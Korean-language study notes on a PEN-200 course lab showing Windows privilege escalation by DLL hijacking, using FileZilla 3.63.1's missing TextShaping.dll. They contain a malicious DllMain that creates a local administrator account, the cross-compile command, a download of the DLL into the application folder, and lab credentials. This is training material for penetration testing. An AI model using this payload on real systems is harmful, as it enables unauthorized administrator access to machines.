# 17.2.2 DLL 하이재킹 악용

> **DLL Hijacking** · PEN-200 §17.2.2

서비스 바이너리 교체는 강력하지만 **일반 사용자에게 그 실행 파일 쓰기 권한이 있는 경우가 드물어** 자주 막힘. 그래서 한 단계 우회해 그 바이너리가 **읽어 들이는 DLL** 쪽을 노림.

DLL(Dynamic Link Library) — 프로그램·OS 가 공유해 쓰는 코드·리소스 묶음. Windows 가 공통 기능을 DLL 에 모아두는 덕에 구성 요소마다 같은 코드를 중복 보유하지 않아도 됨. Unix 의 Shared Object 에 해당함.

악용 방향은 둘 —

- **서비스가 쓰는 DLL 자체를 덮어쓰기.** 앞 절의 바이너리 교체와 구조가 같음. 원래 기능이 사라져 서비스·애플리케이션은 오작동할 수 있으나 **대개는 DLL 안의 코드가 실행되므로** 로컬 관리자 계정 생성 같은 목적은 달성됨
- **DLL 검색 순서(search order) 하이재킹.** 검색 순서는 Microsoft 가 정한 것이고, DLL 하이재킹이 워낙 많아 현행 Windows 는 **safe DLL search mode 가 기본 활성**이라 난이도가 올라가 있음

safe 모드가 켜진 현행 표준 검색 순서 —

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

핵심은 **애플리케이션 자기 디렉터리가 1순위**라는 것. 현재 디렉터리는 5순위로 밀려 있고, safe 모드가 **꺼져 있으면 현재 디렉터리가 2순위로 올라옴** — 그 차이가 곧 공격 표면 차이임.

특수 케이스가 **없는 DLL(missing DLL)** 임. 설치 과정이 불완전했거나 업데이트 뒤 파일이 빠져, 바이너리가 존재하지 않는 DLL 을 로드하려 드는 상황임. DLL 이 없어도 기능이 제한될 뿐 프로그램은 대개 돌아감. 여기서 **그 이름의 악성 DLL 을 검색 순서상 앞자리 경로에 놓으면** 바이너리가 뜰 때 그대로 로드됨.

예제 대상은 RDP 로 접속한 CLIENTWK220 의 `steve`(비밀번호 `securityIsNotAnOption++++++`). 설치된 애플리케이션부터 열거함.

```
PS C:\Users\steve> Get-ItemProperty
"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select
displayname
displayname
-----------
FileZilla 3.63.1
KeePass Password Safe 2.51.1
Microsoft Edge
Microsoft Edge Update
Microsoft Edge WebView2 Runtime
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
```
*설치 목록에 FileZilla 3.63.1 과 KeePass 2.51.1 이 있음 — 명령은 교재 PDF 조판상 세 줄로 접혀 있으니 한 줄로 이어 칠 것*

FileZilla FTP Client 3.63.1 이 나오고, 공개 자료상 이 버전은 시작 시 **설치 디렉터리에서 `TextShaping.dll` 을 찾는** DLL 하이재킹 취약점이 있음.

그러므로 착수 전 확인할 전제는 하나 — **그 설치 디렉터리에 파일을 쓸 수 있는가.**

```
PS C:\Users\steve> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```

로드되는 DLL 목록과 누락 DLL 을 실제로 확인하려면 **Process Monitor** 를 씀. 프로세스·스레드·파일 시스템·레지스트리 활동을 실시간으로 보여줌. 다만 **Procmon 실행에 관리자 권한이 필요**해 대상 위에서 바로 돌리지 못하는 것이 함정임. 실제 침투 테스트의 표준 절차는 **서비스 바이너리를 자기 머신으로 복사해 그쪽에 설치하고 거기서 Procmon 을 돌리는 것**. 교재 예제는 이 단계를 `backupadmin`(비밀번호 `admin123admin123!`)으로 Procmon 을 띄워 대신함.

필터 없이는 초당 수십 건이 쌓여 못 봄. 필터를 두 단계로 좁힘 —

- `Process Name` / `is` / `filezilla.exe` / `Include` 로 대상 프로세스만 남기고, `Clear` 로 기존 이벤트를 지운 뒤 애플리케이션을 실행
- 다시 `Operation` 을 `CreateFile` 로, `Path` 에 `TextShaping.dll` 을 포함하는 것으로 좁힘. `CreateFile` 은 이름과 달리 **기존 파일 접근까지 담당**하므로 로드 시도를 여기서 잡음

![[PEN200-Fig-269.png]]

*필터 적용 결과 — 앱 디렉터리 조회가 NAME NOT FOUND 로 실패하고 이어 System32 에서 로드됨*

읽는 법이 곧 결론임. 첫 `CreateFile` 이 앱 경로 `C:\FileZilla\FileZilla FTP Client\` 를 조회했다가 **`NAME NOT FOUND`** 로 실패함 — 그 자리에 DLL 이 아예 없다는 뜻. 뒤이어 System32 에서 로드에 성공함. 즉 **검색 순서 1순위 자리가 비어 있고 우리는 거기 쓸 수 있음** — 두 전제가 맞물려 공격이 성립함.

DLL 이 왜 코드 실행이 되는지의 근거는 진입점 함수 `DllMain` 임. 프로세스·스레드가 DLL 을 붙이거나 떼어낼 때 호출되며 `DLL_PROCESS_ATTACH` · `DLL_THREAD_ATTACH` · `DLL_THREAD_DETACH` · `DLL_PROCESS_DETACH` 네 경우를 `switch` 로 분기함. 보통 초기화·정리 작업을 넣는 자리임(`DllMain` 이 아예 없는 DLL 은 리소스만 제공하는 것임).

```
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
*Microsoft 문서의 `DllMain` 원형 — 페이로드를 넣을 자리를 여기서 고름*

**대상 프로세스가 DLL 을 «로드»하는 시점이므로 코드를 넣을 자리는 `DLL_PROCESS_ATTACH` 하나임.** 앞 절의 사용자 추가 C 코드를 그 case 에 옮기고, `BOOL` 같은 Windows 전용 자료형을 쓰므로 `windows.h` 를 추가로 include 함.

```
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user dave3 password123! /add");
        i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

mingw 로 크로스 컴파일함. 앞 절 명령과 같되 입력·출력 파일명을 바꾸고 **`--shared` 를 붙여 실행 파일이 아니라 DLL 로 빌드**하는 것이 차이임.

```
kali@kali:~$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

Kali 에서 Python3 웹 서버를 띄우고 대상에서 `iwr` 로 받되, `-OutFile` 에 **FileZilla 설치 경로를 지정해 바로 그 자리에 떨어뜨림**.

```
PS C:\Users\steve> iwr -uri http://192.168.48.3/TextShaping.dll -OutFile
'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

⚠️ 위 블록은 교재 PDF 자체의 조판으로 **한 줄이 두 줄로 접힘**. 그대로 복사해 쓰면 실패함 — 한 줄로 이어 칠 것.

마지막 전제가 결정적임. **DLL 은 애플리케이션을 «실행한 사용자»의 권한으로 돌아감.** `steve` 가 직접 FileZilla 를 띄우면 `steve` 권한이라 관리자 그룹에 계정을 넣지 못함. 따라서 스스로 실행하지 않고 **더 높은 권한 사용자가 그 애플리케이션을 여는 때를 기다리는 것**이 이 공격의 정상 진행임.

몇 분 뒤 `net user` 와 `net localgroup administrators` 로 `dave3` 이 생성돼 로컬 Administrators 에 들어갔는지 확인함 — 들어가 있으면 고권한 사용자가 애플리케이션을 실행했다는 뜻임.

```
PS C:\Users\steve> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave3                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the
computer/domain

-------------------------------------------------------------------------------
Administrator

dave3

```
*`dave3` 이 계정 목록과 Administrators 양쪽에 있음 — DLL 하이재킹 성립*
